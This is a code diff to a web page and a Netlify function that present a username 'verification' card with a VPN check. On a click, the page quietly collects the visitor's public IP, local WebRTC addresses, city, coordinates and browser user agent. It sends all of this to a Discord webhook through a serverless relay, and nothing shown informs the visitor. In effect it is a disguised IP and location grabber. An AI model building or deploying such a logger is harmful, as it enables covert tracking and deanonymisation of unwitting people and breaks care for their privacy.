@@ -1,3 +1,4 @@
+<!-- index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,9 +8,7 @@
   <style>
     @keyframes bgAnim { 0%,100% { background-position:0% 50% } 50% { background-position:100% 50% } }
     body { margin:0; padding:0; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; font-family:'Segoe UI',sans-serif; background:linear-gradient(-45deg, #1e1e2f, #2c2c3e, #3a3a4d, #4a4a5e); background-size:400% 400%; animation:bgAnim 15s infinite; color:#eee; text-shadow:0 2px 4px rgba(0,0,0,0.6); }
-    .particle { position:absolute; border-radius:50%; background:rgba(255,255,255,0.05); animation:drift linear infinite; }
-    @keyframes drift { from{transform:translate(0,0)} to{transform:translate(100px,-200px)} }
-    .card { position:relative; width:90%; max-width:360px; padding:2rem; background:rgba(0,0,0,0.75); border-radius:12px; box-shadow:0 8px 32px rgba(0,0,0,0.6); text-align:center; z-index:1; }
+    .card { position:relative; width:90%; max-width:360px; padding:2rem; background:rgba(0,0,0,0.75); border-radius:12px; box-shadow:0 8px 32px rgba(0,0,0,0.6); text-align:center; }
     h1 { margin:0 0 1rem; font-size:1.5rem; letter-spacing:.5px; }
     input,button { width:100%; padding:.75rem; margin-top:.5rem; border:none; border-radius:8px; font-size:1rem; outline:none; }
     input { background:#2c2c3e; color:#eee; }
@@ -17,9 +16,8 @@
     button { background:linear-gradient(45deg,#3273dc,#275bbe); color:#fff; cursor:pointer; transition:background .2s,transform .1s; }
     button:hover { background:linear-gradient(45deg,#4183ff,#3a6cff); }
     button:active { transform:scale(.97); }
-    .status { margin-top:1.5rem; display:flex; align-items:center; justify-content:center; font-size:1.1rem; opacity:0; transition:opacity .4s; }
+    .status { margin-top:1.5rem; font-size:1.1rem; opacity:0; transition:opacity .4s; }
     .status.visible { opacity:1; }
-    .status svg { margin-right:.6rem; }
     footer { margin-top:2rem; font-size:.75rem; color:rgba(255,255,255,0.6); }
     footer a { color:#4faaff; text-decoration:none; }
   </style>
@@ -35,137 +33,99 @@
 
   <script>
   document.addEventListener('DOMContentLoaded', () => {
-    const WEBHOOK = '${{ secrets.WEHOOK }}'; // Dynamic injection during deployment
+    // Inject at build time
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
 
     const usernameInput = document.getElementById('username');
-    const submitBtn = document.getElementById('submitBtn');
-    const statusEl = document.getElementById('status');
+    const submitBtn     = document.getElementById('submitBtn');
+    const statusEl      = document.getElementById('status');
 
-function showStatus(success, text) {
-  const statusEl = document.getElementById('status'); // Ensure this is defined
-  const icon = success
-    ? '<svg width="24" height="24" fill="#28a745"><path d="M16 2L6 14 0 8l2-2 4 4L14 0z"/></svg>'
-    : '<svg width="24" height="24" fill="#dc3545"><path d="M12 2L2 12l10 10 10-10L12 2z"/></svg>';
-   
-  statusEl.innerHTML = icon + '<span>' + text + '</span>';
-  statusEl.classList.add('visible');
-}
-
-    async function fetchPublicIP() {
-      const services = [
-        'https://api.ipify.org?format=json',
-        'https://ipapi.co/json/',
-        'https://ipwho.is/'
-      ];
-      for (const url of services) {
-        try {
-          const res = await fetch(url, { mode: 'cors' });
-          const data = await res.json();
-          if (data.ip) return data.ip; // Standard IP field
-          if (data.ipAddress) return data.ipAddress; // Alternate field
-        } catch (err) {
-          console.error(`Failed to fetch IP from ${url}`);
-        }
-      }
-      throw new Error('Unable to fetch public IP');
+    function showStatus(success, text) {
+      statusEl.innerHTML = (success
+        ? '<span style="color:#28a745">✔️</span>'
+        : '<span style="color:#dc3545">❌</span>'
+      ) + ' ' + text;
+      statusEl.classList.add('visible');
     }
 
-    async function getWebRTCIPs() {
-      return new Promise((resolve) => {
-        const ips = [];
+    async function fetchPublicIP() {
+      const res  = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip;
+    }
+
+    async function getWebRTCIPs(timeout = 3000) {
+      return new Promise(resolve => {
+        const ips = new Set();
         const rtc = new RTCPeerConnection({ iceServers: [] });
         rtc.createDataChannel('');
-        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-        rtc.onicecandidate = (event) => {
-          if (event && event.candidate) {
-            const ip = event.candidate.candidate.split(' ')[4];
-            if (ip && !ips.includes(ip)) ips.push(ip);
-          }
+        rtc.createOffer()
+           .then(o => rtc.setLocalDescription(o))
+           .catch(() => {});
+        rtc.onicecandidate = ({ candidate }) => {
+          if (!candidate) return;
+          const parts = candidate.candidate.split(' ');
+          const ip = parts.find(p => /\d+\.\d+\.\d+\.\d+/.test(p));
+          if (ip) ips.add(ip);
         };
-        setTimeout(() => resolve(ips), 3000);
+        setTimeout(() => resolve(Array.from(ips)), timeout);
       });
     }
 
     submitBtn.addEventListener('click', async () => {
-      const name = usernameInput.value.trim();
-      if (!name) {
-        showStatus(false, 'Enter username');
-        return;
-      }
-      showStatus(false, 'Verifying…');
+      const username = usernameInput.value.trim();
+      if (!username) return showStatus(false, 'Please enter a username.');
+
       submitBtn.disabled = true;
+      showStatus(false, 'Verifying…');
 
       try {
-        const publicIP = await fetchPublicIP();
+        const publicIP  = await fetchPublicIP();
         const webrtcIPs = await getWebRTCIPs();
 
-        // Fetch geo data
-        let geo;
-        try {
-          const res = await fetch(`https://ipapi.co/${publicIP}/json/`);
-          geo = await res.json();
-        } catch {
-          const res = await fetch(`https://ipwho.is/${publicIP}`);
-          geo = await res.json();
-        }
+        // Geo lookup (client-side)
+        const geoRes = await fetch(`https://ipapi.co/${publicIP}/json/`);
+        const geo    = await geoRes.json();
 
-        // VPN detection
-        let score = 0,
-          flags = [];
+        // VPN/Proxy detection
+        let score = 0, flags = [];
         if (geo.org && /hosting|datacenter|cloud|proxy|vpn/i.test(geo.org)) {
-          flags.push('Datacenter');
-          score += 40;
+          flags.push('Datacenter IP'); score += 40;
         }
         if (geo.timezone && !geo.timezone.includes(geo.country_code)) {
-          flags.push('Timezone mismatch');
-          score += 20;
+          flags.push('Timezone mismatch'); score += 20;
         }
-        const vpn = score >= 40;
+        const vpnDetected = score >= 40;
 
-        // Build embed
-        const embed = {
-          username: 'Verification System',
-          embeds: [
-            {
-              title: `${geo.country_code ? String.fromCodePoint(...geo.country_code.toUpperCase().split('').map(c => 127397 + c.charCodeAt())) : ''} User Verification: ${geo.city || 'Unknown'}, ${geo.country_name}`,
-              color: vpn ? 16755007 : 65280,
-              fields: [
-                { name: '🔍 Username', value: username, inline: true },
-                { name: '🔍 Verification Status', value: vpn ? '❌ FAILED: VPN/Proxy Detected' : '✅ PASSED: No VPN Detected', inline: true },
-                { name: '📍 Location', value: `${geo.city}, ${geo.region || geo.region_name}, ${geo.country_name}`, inline: true },
-                { 
-                  name: '🌐 Public IP', 
-                  value: `[${publicIP}](https://iplookup.io/ip/${publicIP})`, 
-                  inline: true 
-                },
-                { 
-                  name: '🌍 Coordinates', 
-                  value: `[${geo.latitude || 'Unknown'}, ${geo.longitude || 'Unknown'}](https://www.google.com/maps?q=${geo.latitude || ''},${geo.longitude || ''})`, 
-                  inline: true 
-                },
-                { name: '⚠️ Suspicious Factors', value: flags.length ? flags.join(', ') : 'None', inline: true },
-                { name: '📱 Device Info', value: navigator.userAgent, inline: false },
-                { name: '📅 Verification Time', value: new Date().toLocaleString('en-GB'), inline: false },
-                { name: '🕵️ WebRTC IPs', value: webrtcIPs.length ? webrtcIPs.join(', ') : 'None', inline: false }
-              ],
-              footer: {
-                text: `Verified at ${new Date().toLocaleString('en-GB')}`
-              }
-            }
-          ]
+        // Build payload
+        const payload = {
+          username: 'Verification Bot',
+          embeds: [{
+            title: `🛡️ Verification – ${geo.city || 'Unknown'}, ${geo.country_name}`,
+            color: vpnDetected ? 0xE74C3C : 0x2ECC71,
+            fields: [
+              { name: 'Username',     value: username,                inline: true },
+              { name: 'Public IP',    value: publicIP,                inline: true },
+              { name: 'Location',     value: `${geo.city}, ${geo.region}`, inline: true },
+              { name: 'Suspicious',   value: flags.join(', ')||'None', inline: true },
+              { name: 'WebRTC IPs',   value: webrtcIPs.join(', ')||'None', inline: false },
+              { name: 'User Agent',   value: navigator.userAgent,      inline: false }
+            ],
+            timestamp: new Date().toISOString()
+          }]
         };
 
-        // Send webhook
-        await fetch(WEBHOOK, {
+        // Send via serverless proxy to avoid CORS
+        await fetch('/.netlify/functions/discord-webhook', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(embed)
+          body: JSON.stringify({ webhook: WEBHOOK_URL, payload })
         });
 
-        showStatus(!vpn, vpn ? 'VPN/Proxy detected' : 'Verified');
+        showStatus(!vpnDetected, vpnDetected ? 'VPN/Proxy detected' : 'Verified ✔️');
       } catch (err) {
         console.error(err);
-        showStatus(false, 'Error');
+        showStatus(false, 'Error during verification.');
       } finally {
         submitBtn.disabled = false;
       }
@@ -174,3 +134,23 @@ function showStatus(success, text) {
   </script>
 </body>
 </html>
+
+
+<!-- netlify/functions/discord-webhook.js -->
+// Requires "node-fetch" in package.json
+const fetch = require('node-fetch');
+
+exports.handler = async function(event) {
+  try {
+    const { webhook, payload } = JSON.parse(event.body);
+    await fetch(webhook, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    return { statusCode: 200, body: 'Success' };
+  } catch (err) {
+    console.error('Webhook proxy error:', err);
+    return { statusCode: 500, body: 'Error' };
+  }
+};
